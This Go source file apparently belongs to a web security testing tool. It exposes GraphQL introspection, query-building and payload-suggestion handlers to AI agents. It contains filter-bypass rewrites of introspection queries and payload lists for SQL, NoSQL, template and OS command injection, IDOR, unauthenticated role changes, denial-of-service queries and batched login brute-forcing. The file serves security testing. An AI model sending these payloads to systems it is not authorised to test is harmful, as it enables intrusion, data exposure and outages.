package app

import (
	"context"
	"encoding/json"
	"fmt"
	"net/url"
	"strings"

	"github.com/mark3labs/mcp-go/mcp"
)

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------

const introspectionQuery = `{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { kind name description fields(includeDeprecated: true) { name description args { name description type { kind name ofType { kind name ofType { kind name ofType { kind name } } } } defaultValue } type { kind name ofType { kind name ofType { kind name ofType { kind name } } } } isDeprecated deprecationReason } inputFields { name description type { kind name ofType { kind name ofType { kind name } } } defaultValue } interfaces { kind name ofType { kind name } } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { kind name } } directives { name description locations args { name description type { kind name ofType { kind name ofType { kind name } } } defaultValue } } } }"}`

// ---------------------------------------------------------------------------
// Payload data for graphqlSuggestPayloads
// ---------------------------------------------------------------------------

var graphqlPayloads = map[string][]map[string]string{
	"injection": {
		{"name": "SQL injection in argument", "query": `{ user(id: "1' OR '1'='1") { id name } }`},
		{"name": "NoSQL injection", "query": `{ user(id: {"$gt": ""}) { id name } }`},
		{"name": "SSTI in argument", "query": `{ search(query: "{{7*7}}") { results } }`},
		{"name": "OS command injection", "query": `{ lookup(host: "localhost; id") { result } }`},
	},
	"auth_bypass": {
		{"name": "Access other user by ID", "query": `{ user(id: 2) { id email password } }`},
		{"name": "Alias-based IDOR", "query": `{ a: user(id: 1) { email } b: user(id: 2) { email } c: user(id: 3) { email } }`},
		{"name": "Mutation without auth", "query": `mutation { updateUser(id: 1, role: "admin") { id role } }`},
		{"name": "Deprecated field access", "query": `{ user(id: 1) { id passwordHash } }`},
	},
	"info_disclosure": {
		{"name": "Introspection", "query": `{ __schema { types { name fields { name } } } }`},
		{"name": "Type discovery", "query": `{ __type(name: "User") { name fields { name type { name kind } } } }`},
		{"name": "Field suggestion probe", "query": `{ user { idz } }`},
		{"name": "Error-based enumeration", "query": `{ nonExistentField }`},
	},
	"dos": {
		{"name": "Deeply nested query", "query": `{ user(id:1) { friends { friends { friends { friends { friends { id } } } } } } }`},
		{"name": "Circular fragment", "query": `fragment F on User { friends { ...F } } { user(id:1) { ...F } }`},
		{"name": "Large alias expansion", "query": `{ a1:__typename a2:__typename a3:__typename a4:__typename a5:__typename a6:__typename a7:__typename a8:__typename a9:__typename a10:__typename }`},
	},
	"batching": {
		{"name": "Query batching", "query": `[{"query":"{ user(id:1) { id } }"},{"query":"{ user(id:2) { id } }"},{"query":"{ user(id:3) { id } }"}]`},
		{"name": "Batch mutation", "query": `[{"query":"mutation { login(user:\"admin\",pass:\"pass1\") { token } }"},{"query":"mutation { login(user:\"admin\",pass:\"pass2\") { token } }"}]`},
		{"name": "Variable injection", "query": `{ user(id: $id) { id } }`, "variables": `{"id": "1 OR 1=1"}`},
	},
}

// ---------------------------------------------------------------------------
// Input schemas (struct-based, type-safe)
// ---------------------------------------------------------------------------

type GraphqlIntrospectArgs struct {
	Host            string            `json:"host" jsonschema:"required" jsonschema_description:"Target hostname"`
	Port            int               `json:"port" jsonschema:"required" jsonschema_description:"Target port"`
	TLS             bool              `json:"tls" jsonschema:"required" jsonschema_description:"Use HTTPS"`
	Path            string            `json:"path,omitempty" jsonschema_description:"GraphQL endpoint path (default: /graphql)"`
	Headers         map[string]string `json:"headers,omitempty" jsonschema_description:"Additional headers (e.g. Authorization)"`
	BypassTechnique string            `json:"bypassTechnique,omitempty" jsonschema_description:"Bypass: none, get, newline, whitespace, aliased, fragments (default: none)"`
}

type GraphqlBuildQueryArgs struct {
	Schema   string `json:"schema" jsonschema:"required" jsonschema_description:"Schema JSON from graphqlIntrospect"`
	TypeName string `json:"typeName" jsonschema:"required" jsonschema_description:"Type or query name to build query for"`
	MaxDepth int    `json:"maxDepth,omitempty" jsonschema_description:"Maximum nesting depth (default: 2)"`
}

type GraphqlSuggestPayloadsArgs struct {
	Category string `json:"category" jsonschema:"required" jsonschema_description:"Attack category: injection, auth_bypass, info_disclosure, dos, batching, all"`
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

// buildGraphQLRequest constructs a raw HTTP request string for a GraphQL endpoint.
func buildGraphQLRequest(host, path, method, body string, headers map[string]string) string {
	if path == "" {
		path = "/graphql"
	}

	var req strings.Builder
	req.WriteString(fmt.Sprintf("%s %s HTTP/1.1\r\n", method, path))
	req.WriteString(fmt.Sprintf("Host: %s\r\n", host))
	req.WriteString("Content-Type: application/json\r\n")
	req.WriteString("Accept: application/json\r\n")

	for k, v := range headers {
		req.WriteString(fmt.Sprintf("%s: %s\r\n", k, v))
	}

	if body != "" {
		req.WriteString(fmt.Sprintf("Content-Length: %d\r\n", len(body)))
		req.WriteString("\r\n")
		req.WriteString(body)
	} else {
		req.WriteString("\r\n")
	}

	return req.String()
}

// applyIntrospectionBypass modifies the introspection query body and method
// based on the selected bypass technique. Returns (method, path, body).
func applyIntrospectionBypass(technique, originalPath, originalBody string) (method, path, body string) {
	if originalPath == "" {
		originalPath = "/graphql"
	}

	switch technique {
	case "get":
		// Send introspection as a GET request with query parameter
		method = "GET"
		// Extract the query value from the JSON body
		var parsed map[string]string
		if err := json.Unmarshal([]byte(originalBody), &parsed); err == nil {
			path = originalPath + "?query=" + url.QueryEscape(parsed["query"])
		} else {
			path = originalPath + "?query=" + url.QueryEscape(originalBody)
		}
		body = ""

	case "newline":
		// Insert \n into __schema keyword to bypass naive string matching
		method = "POST"
		path = originalPath
		body = strings.Replace(originalBody, "__schema", "__sch\nema", 1)

	case "whitespace":
		// Insert a GraphQL comment into __schema keyword
		method = "POST"
		path = originalPath
		body = strings.Replace(originalBody, "__schema", "__schema #comment\n", 1)

	case "aliased":
		// Wrap __schema in a GraphQL alias to bypass naive keyword blocking
		method = "POST"
		path = originalPath
		body = strings.Replace(originalBody, "__schema", "lorg_schema: __schema", 1)

	case "fragments":
		// Split introspection into a fragment to bypass pattern matching.
		// Extract the selection set from __schema { ... } and wrap it in
		// a named fragment, then reference it from the query.
		method = "POST"
		path = originalPath

		// Locate the selection set inside the query value. The introspection
		// query body is JSON with a "query" key whose value contains
		// __schema { <selectionSet> }.
		var parsed map[string]string
		if err := json.Unmarshal([]byte(originalBody), &parsed); err == nil {
			queryVal := parsed["query"]
			// Find __schema { and extract its inner selection set
			const marker = "__schema {"
			idx := strings.Index(queryVal, marker)
			if idx >= 0 {
				inner := queryVal[idx+len(marker):]
				// Find matching closing brace by counting depth
				depth := 1
				end := 0
				for i, ch := range inner {
					if ch == '{' {
						depth++
					} else if ch == '}' {
						depth--
						if depth == 0 {
							end = i
							break
						}
					}
				}
				selectionSet := strings.TrimSpace(inner[:end])
				fragmentQuery := "fragment IntrospectionFragment on __Schema { " + selectionSet + " } query { __schema { ...IntrospectionFragment } }"
				parsed["query"] = fragmentQuery
				newBody, _ := json.Marshal(parsed)
				body = string(newBody)
			} else {
				body = originalBody
			}
		} else {
			body = originalBody
		}

	default:
		// "none" or empty: standard POST
		method = "POST"
		path = originalPath
		body = originalBody
	}

	return
}

// extractSchemaInfo extracts types, queries, and mutations from a parsed
// GraphQL introspection response for the result summary.
func extractSchemaInfo(respBody string) (schema map[string]any, types []string, queries []string, mutations []string) {
	var parsed map[string]any
	if err := json.Unmarshal([]byte(respBody), &parsed); err != nil {
		return nil, nil, nil, nil
	}

	// Navigate to data.__schema
	data, _ := parsed["data"].(map[string]any)
	if data == nil {
		return nil, nil, nil, nil
	}
	schemaObj, _ := data["__schema"].(map[string]any)
	if schemaObj == nil {
		return nil, nil, nil, nil
	}

	schema = schemaObj

	// Extract type names
	if typeList, ok := schemaObj["types"].([]any); ok {
		for _, t := range typeList {
			if tm, ok := t.(map[string]any); ok {
				if name, ok := tm["name"].(string); ok {
					types = append(types, name)
				}
			}
		}
	}

	// Extract query names from queryType
	if queryType, ok := schemaObj["queryType"].(map[string]any); ok {
		if queryTypeName, ok := queryType["name"].(string); ok {
			// Find the type with this name and extract its fields
			if typeList, ok := schemaObj["types"].([]any); ok {
				for _, t := range typeList {
					if tm, ok := t.(map[string]any); ok {
						if name, _ := tm["name"].(string); name == queryTypeName {
							if fields, ok := tm["fields"].([]any); ok {
								for _, f := range fields {
									if fm, ok := f.(map[string]any); ok {
										if fieldName, ok := fm["name"].(string); ok {
											queries = append(queries, fieldName)
										}
									}
								}
							}
							break
						}
					}
				}
			}
		}
	}

	// Extract mutation names from mutationType
	if mutationType, ok := schemaObj["mutationType"].(map[string]any); ok {
		if mutationTypeName, ok := mutationType["name"].(string); ok {
			if typeList, ok := schemaObj["types"].([]any); ok {
				for _, t := range typeList {
					if tm, ok := t.(map[string]any); ok {
						if name, _ := tm["name"].(string); name == mutationTypeName {
							if fields, ok := tm["fields"].([]any); ok {
								for _, f := range fields {
									if fm, ok := f.(map[string]any); ok {
										if fieldName, ok := fm["name"].(string); ok {
											mutations = append(mutations, fieldName)
										}
									}
								}
							}
							break
						}
					}
				}
			}
		}
	}

	return
}

// resolveTypeName follows ofType chains to find the underlying named type.
func resolveTypeName(typeObj map[string]any) string {
	if typeObj == nil {
		return ""
	}
	if name, ok := typeObj["name"].(string); ok && name != "" {
		return name
	}
	if ofType, ok := typeObj["ofType"].(map[string]any); ok {
		return resolveTypeName(ofType)
	}
	return ""
}

// isScalarOrEnum returns true if the given kind represents a leaf type.
func isScalarOrEnum(kind string) bool {
	return kind == "SCALAR" || kind == "ENUM"
}

// resolveTypeKind follows ofType chains to find the underlying kind.
func resolveTypeKind(typeObj map[string]any) string {
	if typeObj == nil {
		return ""
	}
	kind, _ := typeObj["kind"].(string)
	if kind == "NON_NULL" || kind == "LIST" {
		if ofType, ok := typeObj["ofType"].(map[string]any); ok {
			return resolveTypeKind(ofType)
		}
	}
	return kind
}

// buildQueryForType recursively builds a GraphQL selection set for the named
// type up to maxDepth. visited tracks type names to prevent circular references.
func buildQueryForType(typeMap map[string]map[string]any, typeName string, depth, maxDepth int, visited map[string]bool) string {
	if depth >= maxDepth || visited[typeName] {
		return ""
	}
	visited[typeName] = true
	defer delete(visited, typeName)

	typeObj, ok := typeMap[typeName]
	if !ok {
		return ""
	}

	fields, ok := typeObj["fields"].([]any)
	if !ok || len(fields) == 0 {
		return ""
	}

	var parts []string
	for _, f := range fields {
		fm, ok := f.(map[string]any)
		if !ok {
			continue
		}
		fieldName, _ := fm["name"].(string)
		if fieldName == "" {
			continue
		}

		fieldType, _ := fm["type"].(map[string]any)
		fieldKind := resolveTypeKind(fieldType)
		fieldTypeName := resolveTypeName(fieldType)

		if isScalarOrEnum(fieldKind) {
			parts = append(parts, fieldName)
		} else {
			// OBJECT or INTERFACE -- recurse
			sub := buildQueryForType(typeMap, fieldTypeName, depth+1, maxDepth, visited)
			if sub != "" {
				parts = append(parts, fieldName+" "+sub)
			}
			// If recursion returned nothing (depth limit or circular), skip the field
		}
	}

	if len(parts) == 0 {
		return ""
	}

	return "{ " + strings.Join(parts, " ") + " }"
}

// ---------------------------------------------------------------------------
// Tool handlers
// ---------------------------------------------------------------------------

// graphqlIntrospectHandler sends a GraphQL introspection query to the target,
// optionally applying a bypass technique, and returns the parsed schema.
func (backend *Backend) graphqlIntrospectHandler(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	var args GraphqlIntrospectArgs
	if err := request.BindArguments(&args); err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}

	host := args.Host
	port := fmt.Sprintf("%d", args.Port)
	path := args.Path
	if path == "" {
		path = "/graphql"
	}

	// Apply bypass technique to the introspection query
	method, reqPath, body := applyIntrospectionBypass(args.BypassTechnique, path, introspectionQuery)

	// Build the raw HTTP request
	rawReq := buildGraphQLRequest(host, reqPath, method, body, args.Headers)

	// Construct the URL for logging
	scheme := "http"
	if args.TLS {
		scheme = "https"
	}

	resp, err := backend.sendRepeaterLogic(&RepeaterSendRequest{
		Host:        host,
		Port:        port,
		TLS:         args.TLS,
		Request:     rawReq,
		Timeout:     30,
		HTTP2:       false,
		Index:       0,
		Url:         fmt.Sprintf("%s://%s:%s", scheme, host, port),
		GeneratedBy: "ai/mcp/graphql-introspect",
		Note:        fmt.Sprintf("GraphQL introspection (bypass: %s)", args.BypassTechnique),
	})
	if err != nil {
		return mcp.NewToolResultError(fmt.Sprintf("introspection request failed: %v", err)), nil
	}

	// Parse the response to extract schema information
	rawResponse := resp.Response

	// Extract the response body (after headers)
	respBody := rawResponse
	if idx := strings.Index(rawResponse, "\r\n\r\n"); idx >= 0 {
		respBody = rawResponse[idx+4:]
	} else if idx := strings.Index(rawResponse, "\n\n"); idx >= 0 {
		respBody = rawResponse[idx+2:]
	}

	schema, types, queries, mutations := extractSchemaInfo(respBody)

	success := schema != nil

	result := map[string]any{
		"success":   success,
		"schema":    schema,
		"types":     types,
		"queries":   queries,
		"mutations": mutations,
		"response":  rawResponse,
	}

	return mcpJSONResult(result)
}

// graphqlBuildQueryHandler parses a GraphQL schema and builds a query that
// selects all fields for the specified type up to the given depth.
func (backend *Backend) graphqlBuildQueryHandler(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	var args GraphqlBuildQueryArgs
	if err := request.BindArguments(&args); err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}

	maxDepth := args.MaxDepth
	if maxDepth <= 0 {
		maxDepth = 2
	}

	// Parse the schema JSON
	var schemaObj map[string]any
	if err := json.Unmarshal([]byte(args.Schema), &schemaObj); err != nil {
		return mcp.NewToolResultError(fmt.Sprintf("invalid schema JSON: %v", err)), nil
	}

	// Build a lookup map of type name -> type definition
	typeList, _ := schemaObj["types"].([]any)
	if typeList == nil {
		return mcp.NewToolResultError("schema has no types array"), nil
	}

	typeMap := make(map[string]map[string]any, len(typeList))
	for _, t := range typeList {
		if tm, ok := t.(map[string]any); ok {
			if name, ok := tm["name"].(string); ok {
				typeMap[name] = tm
			}
		}
	}

	// Check if the typeName is a query/mutation root type name or a type name
	targetType := args.TypeName
	if _, ok := typeMap[targetType]; !ok {
		return mcp.NewToolResultError(fmt.Sprintf("type %q not found in schema", targetType)), nil
	}

	visited := make(map[string]bool)
	selectionSet := buildQueryForType(typeMap, targetType, 0, maxDepth, visited)

	if selectionSet == "" {
		return mcp.NewToolResultError(fmt.Sprintf("could not build query for type %q (no fields or depth exceeded)", targetType)), nil
	}

	// Determine if this is a root query type
	queryTypeName := ""
	if qt, ok := schemaObj["queryType"].(map[string]any); ok {
		queryTypeName, _ = qt["name"].(string)
	}
	mutationTypeName := ""
	if mt, ok := schemaObj["mutationType"].(map[string]any); ok {
		mutationTypeName, _ = mt["name"].(string)
	}

	var query string
	switch targetType {
	case queryTypeName:
		// Root query type: wrap fields directly in query { ... }
		query = "query " + selectionSet
	case mutationTypeName:
		// Root mutation type: wrap fields in mutation { ... }
		query = "mutation " + selectionSet
	default:
		// Named type: return just the selection set (caller assembles the query)
		query = "query { " + targetType + " " + selectionSet + " }"
	}

	return mcpJSONResult(map[string]any{
		"query":     query,
		"variables": map[string]any{},
	})
}

// graphqlSuggestPayloadsHandler returns static payload lists organized by
// attack category for GraphQL security testing.
func (backend *Backend) graphqlSuggestPayloadsHandler(ctx context.Context, request mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	var args GraphqlSuggestPayloadsArgs
	if err := request.BindArguments(&args); err != nil {
		return mcp.NewToolResultError(err.Error()), nil
	}

	category := args.Category

	if category == "all" {
		// Return all categories
		allPayloads := make([]map[string]any, 0)
		totalCount := 0
		for cat, payloads := range graphqlPayloads {
			for _, p := range payloads {
				entry := map[string]any{
					"category": cat,
					"name":     p["name"],
					"query":    p["query"],
				}
				if v, ok := p["variables"]; ok {
					entry["variables"] = v
				}
				allPayloads = append(allPayloads, entry)
				totalCount++
			}
		}
		return mcpJSONResult(map[string]any{
			"category": "all",
			"payloads": allPayloads,
			"count":    totalCount,
		})
	}

	payloads, ok := graphqlPayloads[category]
	if !ok {
		validCategories := make([]string, 0, len(graphqlPayloads))
		for k := range graphqlPayloads {
			validCategories = append(validCategories, k)
		}
		return mcp.NewToolResultError(fmt.Sprintf("unknown category %q; valid categories: %s, all", category, strings.Join(validCategories, ", "))), nil
	}

	result := make([]map[string]any, 0, len(payloads))
	for _, p := range payloads {
		entry := map[string]any{
			"name":  p["name"],
			"query": p["query"],
		}
		if v, ok := p["variables"]; ok {
			entry["variables"] = v
		}
		result = append(result, entry)
	}

	return mcpJSONResult(map[string]any{
		"category": category,
		"payloads": result,
		"count":    len(result),
	})
}
